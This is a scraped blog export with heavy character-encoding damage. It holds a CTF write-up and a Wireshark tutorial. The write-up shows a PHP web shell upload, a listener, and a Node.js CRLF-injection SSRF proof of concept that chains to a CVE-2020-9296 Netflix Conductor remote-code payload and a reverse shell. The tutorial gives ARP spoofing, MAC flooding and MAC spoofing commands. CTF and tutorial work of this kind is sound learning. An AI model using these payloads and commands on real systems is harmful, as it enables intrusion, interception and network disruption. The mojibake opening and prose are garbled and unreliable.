Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº&#x27;) è¿”å›åŒ… 123456789101112131415161718192021222324252627282930313233&gt; nc -lv 0.0.0.0 2233GET / HTTP/1.1POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6--GET / HTTP/1.1test: HTTP/1.1Host: 192.168.123.37:2233Connection: close åœ¨SSRFä¸­æˆ‘ä»¬ç»å¸¸ä½¿ç”¨ Gopher åè®®å»æ”»å‡»å†…ç½‘åº”ç”¨ï¼Œæ¯”å¦‚Redisã€MySQLã€FTPç­‰ã€‚ä½†æ˜¯å½“ Gopher åè®®è¢«è¿‡æ»¤äº†ä¹‹åï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡HTTPåè®®å¹¶é…åˆCRLFæ¼æ´è¿›è¡Œæ”»å‡»ï¼Œè¾¾åˆ°ä¸ Gopher åè®®ä¸€æ ·çš„æ•ˆæœã€‚ è‡³æ­¤ï¼Œå®Œæˆäº† nodejs CRLF æ³¨å…¥å¤ç° å†æ¬¡å›åˆ°é¢˜ç›®ä¸­ç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡ é¢˜ç›®çš„ GET ä»£ç†å‘é€ POSTè¯·æ±‚ï¼ˆå‡å¦‚é¢˜ç›®ä¸­çš„ node ç‰ˆæœ¬æ˜¯ &lt; 9ï¼‰ï¼Œç°åœ¨å°è¯•åˆ©ç”¨æ¼æ´ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½åˆ©ç”¨æˆåŠŸã€‚ æ„é€  POCï¼Œnode æˆ– F12 æ§åˆ¶è¿è¡Œ 12345678910111213// netflix çš„å†…ç½‘ IP åœ°å€netflix_host = &quot;10.0.49.14&quot;// åœ¨å¤ç° CVE-2020-9296 æ—¶ç”Ÿæˆçš„ BCEL ç¼–ç bcel_evil = &#x27;&#x27;// ä»¥ä¸‹ä¸ç”¨æ”¹post_payload = &#x27;[\\u&#123;017b&#125;\\u&#123;0122&#125;name\\u&#123;0122&#125;:\\u&#123;0122&#125;$\\u&#123;017b&#125;\\u&#123;0127&#125;1\\u&#123;0127&#125;.getClass().forName(\\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\\u&#123;0127&#125;).newInstance().loadClass(\\u&#123;0127&#125;&#x27; + bcel_evil + &#x27;\\u&#123;0127&#125;).newInstance().class\\u&#123;017d&#125;\\u&#123;0122&#125;,\\u&#123;0122&#125;ownerEmail\\u&#123;0122&#125;:\\u&#123;0122&#125;test@example.org\\u&#123;0122&#125;,\\u&#123;0122&#125;retryCount\\u&#123;0122&#125;:\\u&#123;0122&#125;3\\u&#123;0122&#125;,\\u&#123;0122&#125;timeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;1200\\u&#123;0122&#125;,\\u&#123;0122&#125;inputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;sourceRequestId\\u&#123;0122&#125;,\\u&#123;0122&#125;qcElementType\\u&#123;0122&#125;],\\u&#123;0122&#125;outputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;state\\u&#123;0122&#125;,\\u&#123;0122&#125;skipped\\u&#123;0122&#125;,\\u&#123;0122&#125;result\\u&#123;0122&#125;],\\u&#123;0122&#125;timeoutPolicy\\u&#123;0122&#125;:\\u&#123;0122&#125;TIME_OUT_WF\\u&#123;0122&#125;,\\u&#123;0122&#125;retryLogic\\u&#123;0122&#125;:\\u&#123;0122&#125;FIXED\\u&#123;0122&#125;,\\u&#123;0122&#125;retryDelaySeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;600\\u&#123;0122&#125;,\\u&#123;0122&#125;responseTimeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;3600\\u&#123;0122&#125;,\\u&#123;0122&#125;concurrentExecLimit\\u&#123;0122&#125;:\\u&#123;0122&#125;100\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitFrequencyInSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;60\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitPerFrequency\\u&#123;0122&#125;:\\u&#123;0122&#125;50\\u&#123;0122&#125;,\\u&#123;0122&#125;isolationgroupId\\u&#123;0122&#125;:\\u&#123;0122&#125;myIsolationGroupId\\u&#123;0122&#125;\\u&#123;017d&#125;]&#x27;encode_post_payload = encodeURI(&#x27;http://0.0.0.0:3000/\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;POST\\u&#123;0120&#125;/search?url=http://&#x27; + netflix_host + &#x27;:8080/api/metadata/taskdefs\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Type:application/json\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Length:&#x27; + post_payload.length + &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;&#x27; + post_payload+ &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;GET\\u&#123;0120&#125;/&#x27;)poc = &quot;GET /proxy?url=&quot; + encode_post_payload + &quot; HTTP/1.1&quot;console.log(poc) è¿™é‡Œçš„ encodeURI ç¼–ç  1 æ¬¡æ˜¯é˜²æ­¢ä¼ è¾“è¿‡ç¨‹ä¸­ç‰¹æ®Šå­—ç¬¦è¢«å¹²æ‰ ã€‚ console.log(poc) è¾“å‡ºçš„ä¸œè¥¿æ›¿æ¢ HTTP åŒ…ç¬¬ä¸€è¡Œå³å¯ã€‚ æˆåŠŸåå¼¹ è¿™ä¸ªé¢˜ç›®æµç¨‹æœ‰ç‚¹å¤šï¼Œåšä¸ªå°æ€»ç»“ nodejs æ•°ç»„ç»•è¿‡ç®¡ç†å‘˜ç™»å½• isPublic ç»•è¿‡ï¼Œé€šè¿‡ /proxy è·å– /flag å¾—åˆ°æç¤º é€šè¿‡ docker é»˜è®¤ç½‘æ®µï¼Œæˆ–è€…é¢˜ç›®ç»™çš„æç¤º fuzz å†…ç½‘ç½‘æ®µçš„8080ç«¯å£ æ„é€  CVE-2020-9296 Netflix Post POC åå¼¹ shell åˆ©ç”¨ nodejs &lt; 9 è¿›è¡Œ CRLFæ³¨å…¥ï¼Œå‘é€ CVE-2020-9296 Netflix Post POC æœ€ç»ˆé€šè¿‡ cat /flag è·å– flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"æ¯”èµ›","slug":"ctf/æ¯”èµ›","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"Wiresharkå…¥é—¨ä¸å®æˆ˜","slug":"Wiresharkå…¥é—¨ä¸å®æˆ˜","date":"2021-04-01T13:13:59.000Z","updated":"2021-04-25T12:09:59.526Z","comments":true,"path":"2021/04/01/Wiresharkå…¥é—¨ä¸å®æˆ˜/","link":"","permalink":"https://tari.moe/2021/04/01/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/","excerpt":"","text":"wiresharkå…¥é—¨: https://www.bilibili.com/video/BV1X5411x7R4ä»–è¿™é‡Œé¡ºåºæœ‰ç‚¹è¯¯ï¼Œåº”è¯¥æ˜¯ P1-P26ï¼ŒP32-P39ï¼ŒP27-P31 Wireshark å…¥é—¨ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤ - WiresharkåŒ…è¿‡æ»¤BPFï¼ˆBerkeley Packet Filterï¼‰ é‡‡ç”¨ä¸è‡ªç„¶è¯­è¨€ç›¸è¿‘çš„è¯­æ³•ï¼Œåˆ©ç”¨è¯­æ³•æ„é€ å­—ç¬¦ä¸²ç¡®å®šä¿ç•™å…·ä½“ç¬¦åˆè§„åˆ™çš„æ•°æ®åŒ…è€Œå¿½ç•¥å…¶ä»–æ•°æ®åŒ… æœ€ç®€å•è¯­æ³•ç©ºç™½å­—ç¬¦ï¼Œä»»ä½•æ•°æ®åŒ…éƒ½ç¬¦åˆç©ºç™½å­—ç¬¦è§„åˆ™ è¯­æ³•è§„åˆ™ typeè¡¨ç¤ºå¯¹è±¡ å¦‚ IPåœ°å€ã€å­ç½‘æˆ–ç«¯å£ -&gt; hostã€netã€port dir è¡¨ç¤ºæ•°æ®åŒ…ä¼ è¾“çš„æ–¹å‘ -&gt; srcã€dst proto è¡¨ç¤ºä¸æ•°æ®åŒ…åŒ¹é…çš„åè®®ç±»å‹ -&gt; etherã€ipã€tcpã€arp æ¼”ç¤ºå®ä¾‹ä¼šå‘ç°ç›´æ¥åœ¨ Apply a display filter é‡Œè¾“å…¥æ˜¯æ— æ³•è¿‡æ»¤çš„ï¼Œ æ–°ç‰ˆçš„ wireshark çš„ expression åŠŸèƒ½åœ¨å¦‚ä¸‹å›¾æ‰€ç¤ºè¿™é‡Œåœ¨ wireshark é‡Œï¼Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ host æ¥è¡¨ç¤ºä¸»æœºåå’Œå¯¹åº”çš„ ip åœ°å€ï¼Œè€Œæ˜¯ä½¿ç”¨ ip.addr = &lt;ip&gt; æ¥è¡¨ç¤ºå…¶ä»–ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œå¦‚ ip.src å’Œ ip.dst åœ¨æ‰¾æœåŠ¡è¿™ä¸€å—ï¼ŒæœåŠ¡éƒ½æ˜¯ä»¥å ç”¨ç«¯å£çš„å½¢å¼å±•ç¤ºçš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼æ¥çœ‹æ€ä¹ˆç”¨ï¼Œç„¶åç‚¹OKå³å¯ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨ é€»è¾‘è¿ç®—ç¬¦å®ç°ç­›é€‰ï¼Œå¦‚ tcp.port == 80 and ip.src == 192.168.123.37å½“ç„¶ä¹Ÿæœ‰ç±»ä¼¼è¡¥å…¨çš„æ“ä½œ wiresharkåŒ…è¿‡æ»¤å™¨åˆ†ç±» - éµå¾ªä¼¯å…‹åˆ©è¯­æ³•è§„åˆ™æ•è·è¿‡æ»¤å™¨ -&gt; åœ¨æŠ“åŒ…ä¹‹å‰è¿›è¡Œè®¾ç½®ï¼Œåœ¨æŠ“å–æ—¶ï¼Œå°±ä¸ä¼šæŠ“å–ä¸ç¬¦åˆæ–‡ä»¶çš„æ•°æ®åŒ… åªæ•è·ç›®æ ‡ç«¯å£ä¸º80çš„TCPæ•°æ®åŒ… -&gt; tcp dst port 80 æ•è·ç›®çš„ä¸»æœºIPåœ°å€ä¸º 192.168.123.37 çš„æ•°æ®åŒ… -&gt; dst host 192.168.123.37 host ä¸æ”¯æŒ cidr åŸŸå ä¹¦å†™ ç­›é€‰è¿‡æ»¤å™¨ ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼‰-&gt; æŠ“åŒ…ä¹‹åè¿›è¡Œåº”ç”¨çš„ï¼Œå³å†æ¬¡ç­›é€‰ç„¶åæ˜¾ç¤ºè¿‡æ»¤å™¨æœ‰ä¸¤ç§åˆ›å»ºæ–¹å¼ è¾“å…¥æ¡†åˆ›å»º å½“ä¸çŸ¥é“å¦‚ä½•åˆ›å»ºå°±çœ‹ä¸‹å›¾è¿™é‡Œ æ•°æ®åŒ…ç»†èŠ‚é¢æ¿åˆ›å»º ... and Selected è¡¨ç¤º ç›®å‰çš„è¿‡æ»¤å™¨ + and è¿›è¡Œè¿æ¥ä¸€å¼€å§‹æ˜¯åªæœ‰ Selected å’Œ Not Selected çš„ è¡¨è¾¾å¼è§„åˆ™ ä¸»é¢˜ + è¿ç®—ç¬¦ + å€¼ é€»è¾‘å…³ç³» ä¸ æˆ– é -&gt; and (&amp;&amp;) or (||) not (!) Wireshark æ•è·æ•°æ®åŒ…æ–‡ä»¶ä¿å­˜ æ‚é¡¹è®¾ç½®wireshark æ•°æ®åŒ…é¢œè‰²çš„æ„æ€å¯ä»¥é€šè¿‡ è§†å›¾ -&gt; ç€è‰²è§„åˆ™è¿›è¡ŒæŸ¥çœ‹ wireshark æ•…éšœåŒ…è¿‡æ»¤æœ‰5ä¸ªç­‰çº§ Error ä¸¥é‡é”™è¯¯ï¼Œè­¬å¦‚ï¼šç•¸å½¢æ•°æ®åŒ…æˆ–è¯†åˆ«å‡ºæ•°æ®åŒ…åè®®å¤´éƒ¨çš„æŸäº›å­—æ®µå’Œé¢„æœŸå€¼ä¸ç¬¦ Warning ä¸€èˆ¬æ€§é—®é¢˜ï¼ˆåº”ç”¨ç¨‹åºé—®é¢˜æˆ–é€šä¿¡é—®é¢˜ï¼‰ï¼Œè­¬å¦‚ï¼šTCP zero window ,TCP window full ,TCPæŠ¥æ–‡æ®µå¤±åºï¼ŒTCPæŠ¥æ–‡æ®µä¸¢å¤± Note å¯èƒ½å¼•å‘æ•…éšœçš„å¼‚å¸¸ç°è±¡ï¼ˆæ­£å¸¸è¡Œä¸ºï¼‰ï¼Œè­¬å¦‚ï¼šTCPé‡ä¼ ï¼Œé‡å¤ç¡®è®¤ï¼Œå¿«é€Ÿé‡ä¼  Chat ç¬¦åˆå¸¸è§„æµé‡çš„ç‰¹å¾ï¼Œè­¬å¦‚ï¼šSYN,FIN,RST Comment OK 123_ws.expert.severity &lt;&#x3D; Noteæˆ–è€…_ws.expert.severity &lt;&#x3D; Chat æŸ¥çœ‹wireshark å†…ç½®æ–‡ä»¶è·¯å¾„ ä¿®æ”¹wiresharké»˜è®¤é…ç½® Wireshark ç½‘ç»œåˆ†æ# Wireshark éƒ¨ç½²æ–¹å¼ è¿œç¨‹æ•°æ®åŒ…æ•è·æ–¹å¼1:å¼€å¯è¿œç¨‹æ¡Œé¢ï¼ŒrdpæœåŠ¡ï¼Œåœ¨ç³»ç»Ÿä¸­å®‰è£…wiresharkè¿›è¡ŒæŠ“åŒ…åˆ†æç¼ºç‚¹: åœ¨äºè¿œç¨‹ç™»å½•è¿‡ç¨‹ä¸­ï¼Œéƒ½ä¼šäº§ç”Ÿæ— å…³ä¸ç›®çš„è¿œç¨‹è¿æ¥æ•°æ®æµé‡ æ–¹å¼2: wireshark è¿œç¨‹æŠ“åŒ…windowsæœåŠ¡ç«¯: winpcap -&gt; rpcapd 12cd &quot;C:\\Program Files (x86)\\WinPcap\\&quot;.\\rpcapd.exe -n å®¢æˆ·ç«¯: wireshark linuxmacosæ³¨æ„ macos ç‰ˆæœ¬æ²¡æœ‰ç›´æ¥æŠ“å–æ•°æ®åŒ…çš„åŠŸèƒ½ï¼Œå¯å‚è€ƒhttps://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/ æœ¬åœ°æ•°æ®åŒ…æ•è·wireshark ä¸èƒ½æŠ“å–æœ¬åœ°ç¯å›ç½‘å¡æ•°æ®åŒ…ä¸è¿‡å¯ä»¥ä½¿ç”¨ RawCaphttps://www.netresec.com/?page=RawCap 12# cmdRawCap.exe ç„¶åæµè§ˆå™¨è®¿é—® localhost ä¸è¿‡å¯ä»¥é€šè¿‡è®¿é—®æœ¬æœº ip ä»£æ›¿ localhost é—´æ¥æ‰å–æ•°æ®åŒ…ï¼ˆç‹—å¤´ è™šæ‹Ÿæœºæ•°æ®åŒ…æ•è·é€‰æ‹©å¯¹åº”ç½‘å¡å³å¯ã€‚ã€‚ã€‚ æ¯”å¦‚åœ¨ kali ä¸Šè¿è¡Œ 1sudo netdiscover -r 192.168.18.1/24 å“ˆå“ˆå“ˆå“ˆï¼ŒåŸæ¥arpå¹¿æ’­è¿˜çœŸå°±è¿™ä¹ˆç›´ç™½ï¼Œï¼ŒWho has â€¦.? Tell â€¦ï¼ˆnetdiscover è¿˜çœŸç›´ç™½ ARPæ¬ºéª—æ•è·æ•°æ®åŒ…æ”»å‡»åŸåˆ™ ä»»ä½•ä¸»æœºå‡èƒ½å‘é€ä¼ªé€ åŒ…ç»™å±€åŸŸç½‘ä¸­çš„å¦ä¸€ä¸»æœºï¼› ä»»ä¸€ä¸»æœºç›¸ä¿¡å®ƒä»¬æ¥å—åˆ°çš„æ‰€æœ‰åŒ…ï¼› å½“ä¸€ä¸ªæ–°çš„å“åº”åŒ…åˆ°è¾¾æ—¶ï¼Œå®ƒç”šè‡³åœ¨æ²¡æœ‰è¯·æ±‚åŒ…è¢«å‘é€çš„æƒ…å†µä¸‹è¦†ç›–æ‰æ—§çš„è®°å½•ã€‚ å®è·µkali ä¸€èˆ¬è¦å…ˆå®‰è£… 1sudo apt install dsniff kali ä¸Šè¿è¡Œ 123sudo arpspoof -i eth0 -t &lt;æ¬ºéª—çš„ç›®æ ‡&gt; &lt;æˆ‘æ˜¯è°&gt;# å¦‚sudo arpspoof -i eth0 -t 192.168.123.37 192.168.123.1 ç„¶åæ­¤æ—¶åœ¨ 192.168.123.37 è¿™å°æœºå™¨ä¸Šwireshark é€‰æ‹©ç½‘å¡ eth0ï¼Œå› ä¸ºæ˜¯æ¬ºéª—è¿™ä¸€å¼ ç½‘å¡ï¼Œwireshark ç­›é€‰è¿‡æ»¤å™¨å¡«å…¥ icmp æŸ¥çœ‹ 12# ç„¶ååœ¨ 192.168.123.37 ä¸Š ping ç½‘å…³ping 192.168.123.1 ä¼šå‘ç° 192.168.123.1 çš„ mac åœ°å€æ˜¯ kaliçš„ã€‚ã€‚ã€‚æ‰€ä»¥åœ¨ 192.168.123.37 ä¸Šæ˜¯ä¸Šä¸äº†ç½‘çš„ï¼Œé™¤ékaliä¸Šå¼€å¯äº†æ•°æ®åŒ…è½¬å‘ï¼Œå½“ ip_forward ä¸º 0 æ—¶ï¼Œæ¬ºéª—çš„ç›®æ ‡ ä¸Šä¸äº†ç½‘ï¼Œå½“è¯¥å€¼ä¸º 1 æ—¶ï¼Œä¼šæŠŠ192.168.123.37å‘é€çš„æ•°æ®åŒ…åšè½¬å‘ç»™ç½‘å…³ï¼Œå°±å¯ä»¥æ­£å¸¸ä¸Šç½‘ï¼Œä½†æ˜¯192.168.123.37çš„æ•°æ®åŒ…éƒ½ä¼šç»è¿‡ kaliã€‚ Wireshark ç½‘ç»œå®‰å…¨é“¾è·¯å±‚å®‰å…¨é’ˆå¯¹äºäº¤æ¢æœºçš„å®‰å…¨é—®é¢˜MACå¯¹ç§°æ¬ºéª— â€”â€” macchangeæ“¦é™¤åªæ˜¯æš‚æ—¶çš„ï¼Œä¸æ˜¯è¦†ç›–åŸæ¥çš„macåœ°å€ï¼Œæœºå™¨é‡å¯åå°±ä¼šæ¢å¤ã€‚é€šè¿‡MACåœ°å€æ¬ºéª—è¾¾åˆ°éšè—çœŸå®ä¸»æœºçš„ç›®çš„ 12345678-e æ”¹å˜çš„æ˜¯åä¸‰å­—èŠ‚ï¼Œå³ä¸æ”¹å˜ç”Ÿäº§å‚å•†-a åŒä¸€ç±»å‹çš„éšæœºä¾›åº”å•†åœ°å€ ( macchanger --list=Huawei å°±æ˜¯åŒä¸€ç±»å‹ )-A éšæœºå‚å•†éšæœºåœ°å€-p æ°¸ä¹…ä¿®æ”¹-r å®Œå…¨éšæœº-l æŸ¥çœ‹æ”¯æŒçš„å‚å•†-b-m è®¾ç½®å‰éœ€è¦å…³é—­ç½‘å¡ 12345sudo ifconfig eth0 down# -m ä¸èƒ½è‡ªå·±å®Œå…¨éšæ„èµ·ï¼Œå¦‚æœå‰ä¸‰å­—èŠ‚ä¸ç¬¦åˆ mac åœ°å€å‘½åè§„èŒƒä¼šæŠ¥é”™# [ERROR] Could not change MAC: interface up or insufficient permissions: Cannot assign requested addresssudo macchanger -m 00:90:d1:33:33:33 eth0sudo ifconfig eth0 up éšæœºåŒ–è®¾ç½® 1sudo macchanger -r eth0 MACåœ°å€æ³›æ´ªåˆ†æ â€”â€” æº¢å‡ºäº¤æ¢æœºCAMè¡¨äº¤æ¢æœºä¹‹æ‰€ä»¥å¯ä»¥äº¤æ¢æ•°æ®ï¼Œæ˜¯å› ä¸ºäº¤æ¢æœºåœ¨å†…å­˜ä¸­ç»´æŠ¤ç€ä¸€å¼ CAMè¡¨ï¼Œå³ ç«¯å£ &lt;-&gt; MACåœ°å€å½“è¡¨è¢«æ·»æ»¡æ—¶ï¼Œå…¶ä»–ä¸»æœºå°±æ— æ³•åœ¨å¯¹åº”çš„ç«¯å£æ­£å¸¸äº¤äº’æ•°æ® 12345sudo macof -h# -x æºç«¯å£ -y ç›®çš„ç«¯å£# æ³›æ´ªsudo macof -i eth0 wireshark æŠ“åŒ…åˆ†æå› ä¸ºå®é™…ä¸­ï¼Œä¸»è¦æ•°æ®åŒ…ç±»å‹æ˜¯ tcp æˆ– udpä¸‹é¢åªæœ‰ ip æ•°æ®åŒ…ï¼Œå› æ­¤å¾ˆå¯èƒ½æœ‰é—®é¢˜ï¼ˆå½“ç„¶æœ‰é—®é¢˜ï¼Œå“ˆå“ˆå¾ˆå¤šæ— å…³çš„ ip ä»¥åŠ macåœ°å€ï¼Œæ•°æ®åŒ…å¾ˆå° æŸ¥æ‰¾æºå¤´ç«¯å£äº¤æ¢æœº 1display mac-address æ‰¾åˆ°å¯¹åº”çš„ç«¯å£ é˜²å¾¡ç­–ç•¥é™åˆ¶äº¤æ¢æœºç«¯å£ MAC åœ°å€æ•°é‡ï¼Œæ¯”å¦‚è¿™ä¸ªç«¯å£åªèƒ½æœ‰3æˆ–5ä¸ªï¼Œé‚£ä»–å°±åªèƒ½æ·»åŠ 3æˆ–5è·³è®°å½•åˆ°CAMè¡¨ï¼Œé‚£ä¹ˆå°±æ— æ³•æº¢å‡ºå•¦ã€‚ STPæ“çºµç”Ÿæˆæ ‘åè®®æŒ‰ç…§æ ‘çš„ç»“æ„æ„é€ ç½‘ç»œæ‹“æ‰‘ï¼Œé¿å…å½¢æˆå›è·¯ã€‚STPåè®®ä¸­çš„å„äº¤æ¢æœºé€šè¿‡äº¤æ¢BPDUæŠ¥æ–‡ä¿¡æ¯ä¼ æ’­ç”Ÿæˆæ ‘ä¿¡æ¯ï¼Œå¦‚æœä¼ªé€ BPDUæŠ¥æ–‡ï¼Œæ§åˆ¶äº¤æ¢æœºçš„ç«¯å£è½¬å‘çŠ¶æ€ï¼Œä»è€ŒåŠ¨æ€æ”¹å˜ç½‘ç»œæ‹“æ‰‘ï¼ŒåŠ«æŒç½‘ç»œæµé‡åˆ°æœ¬åœ°ã€‚ å¹¿æ’­é£æš´ARP DHCP é€šè¿‡åœ¨å±€åŸŸç½‘ä¸­å¹¿æ’­ï¼Œå ç”¨ç½‘ç»œèµ„æºï¼Œç½‘ç»œæ€§èƒ½ä¸‹é™ -&gt; ç½‘ç»œé€Ÿåº¦å˜æ…¢äº§ç”ŸåŸå›  ç½‘ç»œçŸ­è·¯å¼•å‘å¹¿æ’­é£æš´ -&gt; 8æ ¹è¿æ¥ ä¸¤ä¸¤è¿æ¥ -&gt; äº’è”ç½‘ä¸Šç½‘çº¿å¯¼è‡´ç½‘ç»œæ€§èƒ½ä¸‹é™ ç½‘ç»œä¸­å­˜åœ¨ç¯è·¯å¼•å‘å¹¿æ’­é£æš´ ç½‘å¡æŸåå¼•å‘å¹¿æ’­é£æš´ è •è™«ç—…æ¯’å¼•å‘å¹¿æ’­é£æš´ ç½‘ç»œå±‚å®‰å…¨ä¸­é—´äººå®‰å…¨æµ‹è¯• - æ¬ºéª—ARPåè®® å±€åŸŸç½‘å†…ç”¨æ¥å¯»æ‰¾ä¸»æœºå‘é€æ•°æ®åŒ…çš„åè®®ï¼Œé€šè¿‡å®ƒå¯ä»¥æ‰¾åˆ°æŒ‡å®š IP åœ°å€å¯¹åº”çš„ MACåœ°å€ æ¯å°ç»ˆç«¯è®¾å¤‡éƒ½å…·æœ‰ARPç¼“å­˜è¡¨ arp -a æŸ¥çœ‹ç¼“å­˜è¡¨ arp -d åˆ é™¤ç¼“å­˜è¡¨ è¡¨çš„å¡«å……ï¼Œå¯»æ‰¾ IP åœ°å€å¯¹åº”MACåœ°å€ï¼Œå¦‚æœæ²¡æœ‰åˆ™å¹¿æ’­æ­¤æ—¶è®¾ç½®çš„ç›®æ ‡MACåœ°å€ä¸º (00:00:00:00:00:00) 